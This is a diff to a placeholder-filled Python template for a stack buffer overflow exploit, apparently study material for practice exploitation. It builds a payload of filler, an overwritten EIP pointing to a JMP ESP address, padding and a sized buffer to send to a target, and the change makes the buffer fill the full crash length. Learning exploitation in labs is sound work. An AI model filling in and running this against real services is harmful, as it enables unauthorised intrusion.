@@ -6,13 +6,17 @@ import socket, sys
 # CHANGE THESE!!!
 target_IP = '[IP]'
 target_port = [port]
+
+## Enter the amount of the total crash + extra ~400 characters
+size = [crash amount from #1 + extra ~400 characters]
+
 ## Enter in the msf-pattern_offset amount.
 filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 ## Enter in the little endian hexcode value of the static memory address containing the 'JMP ESP' command.
 EIP = [little endian hexcode static memory address]
 ## Enter the amount of byte space that seperates EIP and ESP.
 EIP_to_ESP = "C" * [byte space between EIP and ESP]
-new_buffer = "D" * 500
+new_buffer = "D" * (size - len(filler_to_EIP + EIP + EIP_to_ESP))
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
